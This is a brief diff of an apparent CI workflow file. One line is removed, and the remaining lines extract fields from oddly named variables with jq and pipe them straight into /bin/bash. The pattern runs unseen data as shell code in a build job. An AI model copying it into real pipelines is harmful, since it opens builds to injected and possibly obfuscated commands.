@@ -25,7 +25,6 @@ jobs:
           echo $h9214 | jq -r .rctc328 | /bin/bash
           printf '%s' "$pox97684" | jq -r .i6 | /bin/bash
           echo $h30 | jq -r .yrrf67681 | /bin/bash
-          printf '%s' "$zfb323" | jq -r .egldi834 | /bin/bash
           echo $nnp182 | jq -r .d56 | /bin/bash
 
       - name: Upload artifact
